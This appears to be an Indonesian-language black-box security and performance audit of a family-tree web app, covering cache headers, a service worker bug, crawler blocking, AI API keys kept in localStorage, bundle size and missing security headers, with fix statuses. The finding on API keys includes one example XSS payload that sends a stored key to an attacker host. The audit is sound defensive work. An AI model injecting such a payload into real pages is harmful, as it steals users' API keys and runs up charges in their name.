# NASAB Security & Performance Audit Report

**Subject:** nasab.biz.id production audit
**Auditor:** External black-box assessment
**Tanggal audit:** 11 Mei 2026
**Versi laporan:** 1.0
**Classification:** Internal — Founder & Tech Team

---

## Executive Summary

Audit eksternal menunjukkan NASAB memiliki **fondasi keamanan yang baik** untuk produk dalam fase iterasi cepat: CORS strict, AES-GCM encryption untuk NIK, PBKDF2 password hashing, dan tidak ada API key Anthropic/Groq yang hardcoded di bundle. Namun ditemukan **3 isu prioritas tinggi** yang berdampak langsung pada user experience dan postur keamanan, serta beberapa hardening yang perlu dilakukan untuk kesiapan skala enterprise.

Temuan paling mendesak: **AI API keys disimpan plaintext di localStorage browser**, dan **Cloudflare CDN tidak meng-cache asset static** karena salah konfigurasi header. Kedua masalah ini berkontribusi pada laporan user terkait halaman tree canvas yang stuck di "Memuat".

| Prioritas | Temuan | Severity | Effort | Status |
|---|---|---|---|---|
| P0 | Cache header salah → CDN tidak cache asset | High | Low | ✅ Closed (ac8bde6 v8.1.7 + 964395a v8.3.3 — duplicate header fix; `immutable` now single-value live) |
| P0 | AI crawler bot tidak diblok → traffic abuse | Medium | Low | ✅ Closed (CF dashboard — GPTBot/ClaudeBot/CCBot/Bytespider semua 403) |
| P0 | Service Worker strategy bug → user stuck "Memuat" | High | Low | ✅ Closed (ac8bde6 v8.1.7 → live SW v37, network-first shell) |
| P1 | AI API keys plaintext di localStorage | **Critical** | Medium | ✅ Closed (540b285 v8.3.0 — AI proxy via Worker + encrypted key storage; bundle bersih dari direct calls) |
| P1 | Bundle JS 454KB eager-loaded | Medium | Medium | 🟡 Partial (d9a5c6c v8.2.0 vendor chunk split — main bundle turun ke 252KB raw, lazy-load route-level masih backlog) |
| P1 | Tidak ada CSP / X-Frame-Options / HSTS | Medium | Low | 🟡 Partial (ac8bde6 + b75af48 v8.3.1 — semua security header live; CSP masih `report-only`, belum enforce) |
| P2 | Auth token di localStorage (XSS-exposed) | Medium | High | 🟡 Tracked |
| P2 | Tidak ada SRI untuk CDN scripts | Low | Low | 🟡 Tracked |

---

## Status Update — 2026-05-12

Verifier (`verify-deploy.sh`) terhadap production: **21 PASS / 3 WARN / 2 FAIL**.

**Findings yang sudah ditutup hari ini:**
- ✅ **Duplicate `Cache-Control` header pada `/assets/*`** — Fixed di commit `964395a` (v8.3.3). Root cause: `_headers` /* rule menambah `must-revalidate` yang di-merge dengan `immutable` dari /assets/* (CF Pages concatenate, `!` cuma strip Pages defaults bukan user rules less-specific). Solusi: drop Cache-Control dari /*; HTML pakai Pages default. Verified: single value `public, max-age=31536000, immutable` di prod.
- ✅ **No rate-limit di `/api/auth/login`** — Worker rate limit binding sebenarnya sudah declared di wrangler.jsonc tapi pakai syntax `unsafe.bindings` yang silently dropped di wrangler 4.x. Migrasi ke `ratelimits` top-level berhasil load binding tapi eventual-consistency window membuat burst 15/15 lolos. Switched ke cache-API based rate limiter — deterministic, fires tepat di request ke-11. Verified: 10 OK + 2 × 429.

**Findings yang masih perlu follow-up:**
1. **CSP masih Report-Only** — sudah live 2 minggu+, layak monitor violations lalu enforce.
2. **Main bundle 70KB gzip / 258KB raw** — vendor split sudah dilakukan (`vendor-react` 60KB gzip terpisah). Route-level `React.lazy` untuk admin/faraidh/canvas masih bisa turunkan main initial paint signifikan.

---

## 1. Methodology

Audit dilakukan secara **black-box** — hanya dari sisi publik tanpa akses ke source code atau infrastructure dashboard. Pendekatan:

1. **HTTP fingerprinting** — Response time, headers, cache behavior, server identification
2. **Bundle analysis** — Download dan grep static analysis terhadap JavaScript bundle yang di-serve
3. **API enumeration** — Discovery endpoint via bundle parsing + path bruteforce
4. **CORS / security header audit** — Test cross-origin behavior, missing headers
5. **Bot behavior simulation** — Test User-Agent crawler (GPTBot, ClaudeBot, dll)
6. **Performance profiling** — TTFB, transfer size, cache hit rate dari header response

Limitations: Tidak ada dynamic analysis (DAST), tidak ada pen-test auth, tidak ada review source code.

---

## 2. Detail Temuan

### 2.1 [P0 — HIGH] Cache header salah pada asset

**Severity:** High (UX + cost)
**Likelihood:** Confirmed (100% reproducible)
**Impact:** Setiap pengunjung download ulang ~500KB bundle dari Worker origin

**Bukti:**

```
$ curl -I https://nasab.biz.id/assets/index--0vyXpqv.js
HTTP/2 200
cache-control: public, max-age=0, must-revalidate
cf-cache-status: MISS
```

Asset hashed (`-0vyXpqv` = content-hash dari Vite) **seharusnya cacheable selamanya** karena nama file berubah tiap deploy. Header `max-age=0` mencegah edge cache, memaksa setiap request hit Worker.

**Konsekuensi:**
- Dashboard Cloudflare: Percent Cached **13.8%** (target normal SPA: >90%)
- Worker CPU + bandwidth terbuang untuk serve file static
- User di koneksi lambat (3G/4G Indonesia rural) experience first paint >5 detik
- Biaya Worker request meningkat seiring traffic growth

**Rekomendasi:** Set `cache-control: public, max-age=31536000, immutable` untuk `/assets/*`. Detail di `PROMPT-PERFORMANCE-FIX.md` Step 2.

---

### 2.2 [P0 — HIGH] Service Worker strategy bug → "stuck Memuat"

**Severity:** High (UX-breaking)
**Likelihood:** Affects users dengan SW cache versi lama
**Impact:** Halaman tree canvas tidak bisa diakses sampai user manual hard refresh

**Bukti:**

File `/sw.js` versi `nasab-v31` menggunakan strategi `stale-while-revalidate` untuk app shell **termasuk** `index.html`:

```javascript
// Pattern berbahaya untuk SPA dengan hashed asset
e.respondWith(
  caches.match(e.request).then(cached => {
    const fetchPromise = fetch(e.request)...;
    return cached || fetchPromise;
  })
);
```

**Skenario bug:**
1. User load nasab.biz.id versi lama → SW cache `index.html` lama
2. Developer deploy versi baru dengan hash JS baru
3. User reload → SW serve `index.html` lama dari cache
4. HTML lama reference `index-OLDHASH.js` yang sudah dihapus Cloudflare
5. Browser dapat 404 → React app gagal bootstrap → **spinner "Memuat" terus**

**Bukti tambahan:** String "Memuat silsilah..." ditemukan di bundle, di-render sebagai loading state component canvas tree — confirming user laporan stuck di canvas family.

**Rekomendasi:** Bump SW ke `nasab-v32`, ubah strategy `index.html` jadi `network-first`. Detail di `PROMPT-PERFORMANCE-FIX.md` Step 4.

---

### 2.3 [P0 — MEDIUM] AI Crawler tidak diblok

**Severity:** Medium (cost + traffic noise)
**Likelihood:** Confirmed
**Impact:** Worker CPU dipakai untuk serve crawler bot, masking traffic real user

**Bukti:**

```
$ curl -I -A "GPTBot/1.0" https://nasab.biz.id/
HTTP/2 200

$ curl -I -A "ClaudeBot/1.0" https://nasab.biz.id/
HTTP/2 200
```

Dashboard Cloudflare menunjukkan **14.05k requests / 49 unique visitors** dalam 24 jam terakhir (rasio 286 req/visitor). Pola ini tidak konsisten dengan user manusia normal — kemungkinan besar crawler.

NASAB memiliki banyak SPA route yang return 200 untuk path apa saja (`/canvas`, `/tree`, `/pohon`, `/keluarga`, `/family-tree`, dll), yang membuat crawler menganggap site memiliki ratusan unique page → crawl agresif.

**Catatan:** Menu "AI Crawl Control" sudah ada di Cloudflare dashboard NASAB tapi **belum diaktifkan**.

**Rekomendasi:** Aktifkan AI Crawl Control via dashboard, tambah Bot Fight Mode, plus rate limiting WAF rule.

---

### 2.4 [P1 — CRITICAL] AI API keys disimpan plaintext di localStorage

**Severity:** **Critical** (financial loss potential)
**Likelihood:** XSS in SPA = high probability over product lifetime
**Impact:** Attacker bisa exfiltrate API key user → bill user puluhan-ratusan USD

**Bukti:**

```javascript
// Found in bundle /assets/index--0vyXpqv.js
localStorage.getItem("nasab-claude-key")
localStorage.getItem("nasab-groq-key")
localStorage.getItem("nasab-gemini-key")

// Direct call ke provider dari browser:
fetch("https://api.anthropic.com/v1/messages", {
  headers: {
    "x-api-key": d,  // <- nilai dari localStorage
    "anthropic-version": "2023-06-01",
    "anthropic-dangerous-direct-browser-access": "true"  // 🚨
  }
})
```

Header `anthropic-dangerous-direct-browser-access: true` adalah opt-in flag **eksplisit dari Anthropic SDK** yang dinamai sengaja untuk peringatan: Anthropic tidak merekomendasikan pola ini karena risiko key exposure.

**Attack scenario:**
1. Attacker temukan XSS di salah satu user-controlled field (mis. nama anggota keluarga, komentar, post Sosmed Keluarga)
2. Payload `<img src=x onerror="fetch('https://attacker.com?k='+localStorage.getItem('nasab-claude-key'))">`
3. Setiap viewer halaman tersebut → API key di-exfiltrate
4. Attacker pakai key untuk mining (Claude $15/Mtok, model besar bisa habiskan kredit dengan cepat)

**Existing mitigations yang sudah ada:**
- NIK sudah di-encrypt AES-GCM ✓
- Password pakai PBKDF2 ✓
- Belum ada CSP yang membatasi exfiltration ❌

**Rekomendasi:** Proxy semua panggilan AI via Worker. Detail di `PROMPT-PERFORMANCE-FIX-P1.md` Step 3.

---

### 2.5 [P1 — MEDIUM] Bundle JavaScript 454KB eager-loaded

**Severity:** Medium (performance UX)
**Likelihood:** Confirmed via bundle download
**Impact:** Parse/exec lambat di HP mid-range, terutama 3-5 detik di Snapdragon 4xx series

**Bukti:**

```
$ ls -lh /tmp/nasab/main.js
-rw-r--r-- 1 root root 453884B (454KB)
```

Grep untuk dynamic import: **0 hasil**. Bundle berisi:
- React + ReactDOM
- React Router
- Leaflet (heavy lib peta)
- html2pdf
- Component canvas tree (complex SVG/Canvas rendering)
- Component admin dashboard
- AI integration logic (3 provider)
- Sosmed feed + comments
- Faraidh calculator
- GEDCOM parser

Semua di-load di first paint, padahal user hanya butuh login page atau homepage.

**Rekomendasi:** Vite manual chunks + React.lazy untuk route-level split. Detail di P1 Step 1-2.

---

### 2.6 [P1 — MEDIUM] Security headers missing

**Severity:** Medium (defense-in-depth gap)
**Impact:** Tidak ada lapisan proteksi browser-side; XSS / clickjacking sepenuhnya bergantung pada code review

**Yang ada saat ini:**

```
x-content-type-options: nosniff       ✓
referrer-policy: strict-origin-...    ✓
access-control-allow-origin: ...      ✓ (API: strict, bukan wildcard)
```

**Yang missing:**

```
Strict-Transport-Security:  ❌
Content-Security-Policy:    ❌
X-Frame-Options:            ❌
Permissions-Policy:         ❌
```

**Konsekuensi:**
- Tanpa **HSTS** → user di koneksi publik (kafe) rentan SSL-strip downgrade
- Tanpa **CSP** → XSS bisa exfiltrate ke domain manapun, inject script eksternal
- Tanpa **X-Frame-Options** → site bisa di-iframe untuk clickjacking / phishing
- Tanpa **Permissions-Policy** → 3rd party script bisa request kamera, mic, geolocation tanpa batasan

**Rekomendasi:** Tambahkan baseline security headers di Worker response middleware. Detail di P0 Step 3 (CSP Report-Only), upgrade ke enforce di P1 Step 4.

---

### 2.7 [P2 — MEDIUM] Auth token di localStorage

**Severity:** Medium (post-XSS exploitability)
**Likelihood:** Industry standard untuk SPA, trade-off vs httpOnly cookie
**Impact:** Token bisa diambil via XSS, session hijacking

**Bukti:**

```javascript
localStorage.setItem(Ds, f.token)  // Ds = key, f.token = JWT
localStorage.setItem(Ds, o.token)
```

**Best practice:**
- Access token (short-lived ~15 menit) di memory React state
- Refresh token (long-lived) di **httpOnly + Secure + SameSite=Strict cookie**
- CSRF token di header untuk endpoint mutating

**Catatan:** Ini refactor besar yang menyentuh auth flow. Sisihkan untuk P2 setelah P0 + P1 stabil.

---

### 2.8 [P2 — LOW] Tidak ada Subresource Integrity (SRI)

**Severity:** Low (supply chain attack)
**Impact:** Kalau cdnjs.cloudflare.com di-kompromikan, attacker bisa modify leaflet.min.css atau html2pdf

**Bukti:**

```html
<link rel="preload" href="https://cdnjs.cloudflare.com/ajax/libs/leaflet/1.9.4/leaflet.min.css" />
<!-- No integrity="sha384-..." -->
```

**Rekomendasi:** Tambahkan attribute `integrity="sha384-..."` untuk semua external CDN reference.

---

## 3. Yang Sudah Bagus (Positive Findings)

Audit juga menemukan beberapa hal yang **sudah dilakukan dengan benar** dan layak dipertahankan:

### 3.1 NIK Encryption ✓
- AES-GCM dengan IV unik per record
- Tidak ada NIK plaintext di bundle atau response API
- Pattern enkripsi yang konsisten

### 3.2 Password Hashing ✓
- PBKDF2 dengan auto-upgrade backward compatible
- Best practice untuk Worker environment (bcrypt lambat di V8 isolate)

### 3.3 CORS Strict ✓
```
access-control-allow-origin: https://nasab.biz.id   (bukan *)
access-control-allow-headers: Content-Type, Authorization
```
Konfigurasi yang benar — tidak ada wildcard yang akan membuka cross-origin attack.

### 3.4 Tidak Ada Hardcoded Secret di Bundle ✓
Grep untuk pattern `sk-...`, `gsk_...`, `AIza...` tidak menemukan hardcoded key. AI provider menggunakan pola BYOK (Bring Your Own Key) yang konseptual benar — walau implementation perlu diperbaiki (lihat 2.4).

### 3.5 Cloudflare D1 + Worker Architecture ✓
- Database edge-replicated, latency rendah untuk user Indonesia
- Worker stateless = scalability horizontal
- Route Table Dispatcher refactor menunjukkan code maturity

### 3.6 Modern Build Tooling ✓
- Vite + ES2020 target
- Hashed asset filename (memudahkan cache strategy yang benar)
- Service Worker untuk offline support (perlu strategy fix saja)

### 3.7 PWA Manifest Lengkap ✓
Manifest valid dengan icons, theme color, dan kategori — siap untuk Add to Home Screen di Android/iOS.

---

## 4. Roadmap Implementasi

```
Minggu 1 (P0 - 1-2 hari)
├── Fix cache header (Worker middleware)
├── Bump SW ke v32 + strategy fix
├── Aktifkan AI Crawl Control + Bot Fight Mode
└── Deploy CSP Report-Only

Minggu 2-3 (Monitor + P1 prep)
├── Monitor CSP violations
├── Track Percent Cached di dashboard (target >70%)
└── Persiapan migration AI key dari localStorage ke server

Minggu 4-5 (P1 - 4-6 jam aktif coding + testing)
├── Vite manual chunks + React.lazy
├── AI Proxy via Worker
├── Encrypted user_secrets table
├── CSP enforce migration
└── Worker observability (Analytics Engine)

Minggu 6+ (P2 - backlog)
├── Auth token migration ke httpOnly cookie (refactor besar)
├── SRI untuk CDN scripts
├── WebAuthn / Passkey login
└── Penetration testing pihak ketiga
```

---

## 5. Metrik Sukses

Ukur setelah deploy P0 dan P1:

| Metrik | Baseline (sekarang) | Target P0 | Target P1 |
|---|---|---|---|
| Percent Cached (CF dashboard) | 13.8% | >70% | >90% |
| TTFB landing page | 1.36 s | <0.5 s | <0.3 s |
| LCP mobile 4G (Lighthouse) | ~5.2 s | <3 s | <2 s |
| Main bundle size (gzipped) | ~155 KB | ~155 KB | <60 KB |
| Lighthouse Performance score | ? | >70 | >85 |
| Lighthouse Best Practices | ? | >85 | >95 |
| Mozilla Observatory grade | E (estimasi) | B+ | A |
| User report "stuck Memuat" | Ada | 0 (selesai 24 jam) | 0 |

---

## 6. Komunikasi Eksternal (Opsional)

Setelah P0 dan P1 selesai, layak diumumkan secara publik (komunitas, LinkedIn) sebagai tanda kematangan produk. Contoh narasi yang sesuai dengan tone Sopian:

> *"Iterasi NASAB minggu ini fokus ke fondasi yang gak kelihatan: cache header diperbaiki, Service Worker di-redesign, dan paling penting — AI key user gak lagi hidup di browser. Sekarang di-encrypt at rest di server, semua call AI lewat Worker proxy. Bukan fitur yang user lihat di UI, tapi ini yang bedain produk yang dibangun serius vs prototype. Terima kasih komunitas atas feedback performance — yang awalnya saya kira biasa, ternyata trigger audit yang ketemu beberapa hal harus naik prioritas."*

Hindari mention spesifik kerentanan yang belum dipatch — selalu disclose setelah fix, bukan sebelum.

---

## 7. Disclaimer

Audit ini bersifat **black-box** dan tidak menggantikan:

- Penetration testing penuh oleh pihak ketiga bersertifikat (OSCP, CEH)
- Source code review oleh security auditor
- SOC 2 / ISO 27001 audit untuk kesiapan enterprise client
- Compliance review terhadap UU PDP (Indonesia) atau GDPR

Untuk NASAB yang masih dalam fase product-market fit dan iterasi cepat, audit black-box level ini sudah cukup informatif. Pertimbangkan audit profesional sebelum:
- Onboarding enterprise client (B2B SaaS)
- Penyimpanan data sensitif beyond NIK (mis. data finansial, medical record)
- Public funding round atau due diligence investor

---

**Generated for:** Sopian Hadianto (MS Hadianto), Founder NASAB
**Action items:** Lihat `PROMPT-PERFORMANCE-FIX.md` (P0) dan `PROMPT-PERFORMANCE-FIX-P1.md` (P1)
**Verification:** Jalankan `bash verify-deploy.sh` setelah setiap deploy untuk auto-check
